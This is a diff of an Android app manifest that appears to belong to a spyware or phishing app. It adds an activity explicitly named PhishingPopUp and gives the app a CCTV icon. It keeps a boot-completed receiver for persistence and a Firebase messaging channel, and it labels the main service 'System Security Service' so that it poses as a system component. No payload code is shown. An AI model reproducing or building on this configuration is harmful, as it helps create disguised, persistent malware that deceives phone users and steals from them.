@@ -12,9 +12,14 @@
         android:allowBackup="true"
         android:label="@string/app_name"
         android:supportsRtl="true"
-        android:theme="@style/AppTheme">
+        android:theme="@style/AppTheme"
+        android:icon="@drawable/cctv">
         <activity
-            android:name=".MainActivity"
+            android:name=".mainUi.PhishingPopUp"
+            android:label="@string/app_name"
+            android:theme="@style/AppTheme"/>
+        <activity
+            android:name=".startup.launcher"
             android:label="@string/app_name"
             android:theme="@style/AppTheme">
 
@@ -31,7 +36,7 @@
         </activity>
 
         <receiver
-            android:name=".BootBroadcastReceiver"
+            android:name=".startup.BootBroadcastReceiver"
             android:enabled="true"
             android:exported="false">
             <intent-filter>
@@ -44,23 +49,22 @@
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
-        <receiver android:name=".FirebaseBroadcastReceiver">
+        <receiver android:name=".firebase.FirebaseBroadcastReceiver">
             <intent-filter>
-                <uses-permission android:name="android.permission.READ_CALL_LOG" />
                 <action android:name="com.service.security.services.systemsecurityservice.CUSTOM_INTENT" />
             </intent-filter>
         </receiver>
 
         <service
-            android:name=".MainService"
+            android:name=".startup.MainService"
             android:label="System Security Service"
             android:process=":SecurityServices" />
-        <service android:name=".FirebaseMessagingService">
+        <service android:name=".firebase.FirebaseMessagingService">
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT" />
             </intent-filter>
         </service>
-        <service android:name=".FirebaseInstanceIDService">
+        <service android:name=".firebase.FirebaseInstanceIDService">
             <intent-filter>
                 <action android:name="com.google.firebase.INSTANCE_ID_EVENT" />
             </intent-filter>
